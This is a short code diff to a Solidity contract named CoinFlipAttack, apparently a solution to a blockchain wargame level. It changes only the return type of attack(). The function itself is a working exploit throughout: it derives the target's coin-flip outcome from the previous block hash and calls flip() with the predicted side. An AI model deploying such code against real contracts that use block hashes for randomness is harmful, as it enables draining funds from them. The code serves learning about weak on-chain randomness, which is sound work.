@@ -42,14 +42,15 @@ contract CoinFlipAttack {
         coinFlip = ICoinFlip(adr);
     }
 
-    function attack() public {
+    function attack() public returns (bool) {
         uint256 blockValue = uint256(blockhash(block.number - 1));
         if (lastHash == blockValue) {
-            return;
+            return false;
         }
         lastHash = blockValue;
         uint256 coinFlipUint = blockValue / FACTOR;
         bool side = coinFlipUint == 1 ? true : false;
         coinFlip.flip(side);
+        return true;
     }
 }
